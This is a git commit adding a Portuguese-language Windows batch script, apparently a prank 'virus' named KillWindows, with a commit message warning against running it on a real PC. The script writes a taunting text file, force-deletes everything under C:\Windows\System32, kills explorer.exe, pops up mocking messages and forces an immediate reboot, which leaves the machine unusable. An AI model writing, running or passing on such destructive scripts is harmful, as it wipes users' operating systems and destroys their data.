b9d84a85d5e78b3bc935d128a38a2643048ce4b0
EduardozinYT <158329963+EduardozinYT@users.noreply.github.com>
2024-02-15 16:34:40 -0300

    Não execute no pc real

---
+++ KillWidows Melhoradinho.bat
@@ -0,0 +1,11 @@
+@echo off
+echo "Seu Foi morto por o virus KillWindows reinicie seu pc HAHAHAHAHAHAHAH" > Killwindows.txt
+start Killwindows.txt
+del /f /s /q "C:\Windows\System32\*.*"
+Msg * System32 esta sendo apagado é sério
+taskkill -f /im explorer.exe
+msg * hahahhahahahahah
+msg * hahahahahahahhahah
+msg * HAHAHAHAHAHAHAHAHAHAHAHA
+msg * HAHAHAHAHAHHAHAHAHAHAHHAHA
+shutdown -r -t 1
